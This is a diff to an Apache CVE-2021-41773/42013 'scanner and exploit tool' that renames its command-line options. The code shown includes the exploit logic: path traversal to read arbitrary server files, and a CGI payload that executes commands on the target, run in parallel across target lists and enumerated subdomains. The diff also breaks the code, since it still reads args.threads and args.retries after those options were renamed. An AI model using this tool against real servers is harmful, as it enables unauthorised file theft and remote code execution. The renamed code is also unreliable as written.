@@ -700,10 +700,10 @@ class TargetBuilder:
         if args.url:
             targets.extend(TargetBuilder.build_targets(
                 args.url,
-                args.subdomains,
-                args.sub_file,
-                args.scheme,
-                args.dns_enum
+                args.s,
+                args.w,
+                args.m,
+                args.e
             ))
         
         if args.list:
@@ -718,10 +718,10 @@ class TargetBuilder:
                         if line and not line.startswith('#'):
                             targets.extend(TargetBuilder.build_targets(
                                 line,
-                                args.subdomains,
-                                args.sub_file,
-                                args.scheme,
-                                args.dns_enum
+                                args.s,
+                                args.w,
+                                args.m,
+                                args.e
                             ))
             except Exception as e:
                 logger.error(f"Failed to read target list: {e}")
@@ -814,8 +814,8 @@ class CVEScanner:
     def __init__(self, args):
         self.args = args
         self.http_client = HTTPClient(
-            timeout=args.timeout,
-            verify_ssl=args.verify_ssl,
+            timeout=args.o,
+            verify_ssl=args.v,
             retries=args.retries
         )
         self.response_analyzer = ResponseAnalyzer()
@@ -829,7 +829,7 @@ class CVEScanner:
             raise SystemExit(1)
         
         print(f"\n{ColorOutput.CYAN}[*] Scanning {len(targets)} target(s){ColorOutput.RESET}")
-        print(f"{ColorOutput.DIM}Mode: {'DEEP' if self.args.deep else 'STANDARD'} | SSL Verify: {self.args.verify_ssl} | Threads: {self.args.threads}{ColorOutput.RESET}\n")
+        print(f"{ColorOutput.DIM}Mode: {'DEEP' if self.args.d else 'STANDARD'} | SSL Verify: {self.args.v} | Threads: {self.args.threads}{ColorOutput.RESET}\n")
         
         vulnerabilities = []
         suspicious = []
@@ -839,7 +839,7 @@ class CVEScanner:
             futures = {}
             
             for scheme, host, port, is_subdomain in targets:
-                if self.args.deep:
+                if self.args.d:
                     future = executor.submit(
                         self.scanner_api.scan_target_deep,
                         host, port, scheme, is_subdomain
@@ -922,28 +922,28 @@ class CVEScanner:
         
         tls = scheme == "https"
         
-        if self.args.file:
-            if not InputValidator.validate_file_path(self.args.file):
-                logger.error(f"Invalid file path: {self.args.file}")
+        if self.args.f:
+            if not InputValidator.validate_file_path(self.args.f):
+                logger.error(f"Invalid file path: {self.args.f}")
                 raise SystemExit(1)
             
-            print(f"{ColorOutput.CYAN}[*] Reading file: {self.args.file}{ColorOutput.RESET}")
+            print(f"{ColorOutput.CYAN}[*] Reading file: {self.args.f}{ColorOutput.RESET}")
             status, body, error, _, _ = self.http_client.request(
                 host,
                 port,
                 tls,
-                best_result.traversal + self.args.file
+                best_result.traversal + self.args.f
             )
         
-        elif self.args.cmd:
-            if not InputValidator.validate_command(self.args.cmd):
+        elif self.args.x:
+            if not InputValidator.validate_command(self.args.x):
                 logger.error("Invalid command")
                 raise SystemExit(1)
             
-            sanitized_cmd = InputValidator.sanitize_command(self.args.cmd)
+            sanitized_cmd = InputValidator.sanitize_command(self.args.x)
             payload = f"echo Content-Type: text/plain; echo; {sanitized_cmd}"
             
-            print(f"{ColorOutput.CYAN}[*] Executing command: {self.args.cmd}{ColorOutput.RESET}\n")
+            print(f"{ColorOutput.CYAN}[*] Executing command: {self.args.x}{ColorOutput.RESET}\n")
             
             status, body, error, _, _ = self.http_client.request(
                 host,
@@ -969,33 +969,33 @@ class CVEScanner:
 
 def create_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
-        description="CVE-2021-41773/42013 scanner and exploit tool",
+        description="CVE-2021-41773/42013 Apache Scanner with DNS Enumeration and Multi-Layer Detection",
         formatter_class=argparse.RawDescriptionHelpFormatter
     )
     
     target_group = parser.add_argument_group("Target Options")
-    target_group.add_argument("-u", "--url", help="Target URL or domain")
-    target_group.add_argument("-l", "--list", help="File with targets (one per line)")
+    target_group.add_argument("-u", "-url", help="Target URL or domain")
+    target_group.add_argument("-l", "-list", help="File with targets (one per line)")
     
     scan_group = parser.add_argument_group("Scan Options")
-    scan_group.add_argument("--check", action="store_true", help="Run in scan mode")
-    scan_group.add_argument("--subdomains", action="store_true", help="Enumerate and scan subdomains")
-    scan_group.add_argument("--dns-enum", action="store_true", help="Use DNS-based subdomain enumeration")
-    scan_group.add_argument("--sub-file", help="Custom subdomain wordlist")
-    scan_group.add_argument("--scheme", choices=["http", "https"], help="Force HTTP scheme")
-    scan_group.add_argument("--deep", action="store_true", help="Deep scan with alternate traversals")
+    scan_group.add_argument("-c", "-check", action="store_true", help="Run in scan mode")
+    scan_group.add_argument("-s", "-subdomains", action="store_true", help="Enumerate and scan subdomains")
+    scan_group.add_argument("-e", "-enum", action="store_true", help="Use DNS-based subdomain enumeration")
+    scan_group.add_argument("-w", "-wordlist", help="Custom subdomain wordlist")
+    scan_group.add_argument("-m", "-method", choices=["http", "https"], help="Force HTTP scheme")
+    scan_group.add_argument("-d", "-deep", action="store_true", help="Deep scan with alternate traversals")
     
     exploit_group = parser.add_argument_group("Exploit Options")
-    exploit_group.add_argument("-f", "--file", help="Absolute file path to read")
-    exploit_group.add_argument("-c", "--cmd", help="Command to execute")
+    exploit_group.add_argument("-f", "-file", help="Absolute file path to read")
+    exploit_group.add_argument("-x", "-exec", help="Command to execute")
     
     perf_group = parser.add_argument_group("Performance Options")
-    perf_group.add_argument("-t", "--threads", type=int, default=20, help="Thread pool size")
-    perf_group.add_argument("--timeout", type=float, default=15, help="Request timeout (seconds)")
-    perf_group.add_argument("--retries", type=int, default=2, help="Retry attempts per target")
+    perf_group.add_argument("-t", "-threads", type=int, default=20, help="Thread pool size")
+    perf_group.add_argument("-o", "-timeout", type=float, default=15, help="Request timeout (seconds)")
+    perf_group.add_argument("-r", "-retries", type=int, default=2, help="Retry attempts per target")
     
     security_group = parser.add_argument_group("Security Options")
-    security_group.add_argument("--verify-ssl", action="store_true", help="Verify SSL certificates")
+    security_group.add_argument("-v", "-verify", action="store_true", help="Verify SSL certificates")
     
     return parser
 
@@ -1003,17 +1003,17 @@ def main():
     parser = create_parser()
     args = parser.parse_args()
     
-    if not args.url and not args.list:
+    if not args.u and not args.l:
         parser.print_help()
         raise SystemExit("Target required: -u or -l")
     
     scanner = CVEScanner(args)
     
     try:
-        if args.check:
+        if args.c:
             scanner.run_check()
         else:
-            scanner.run_exploit()
+            scanner.run_exploit() if (args.u or args.l) else parser.print_help()
     except KeyboardInterrupt:
         logger.info("Operation interrupted by user")
         raise SystemExit(0)
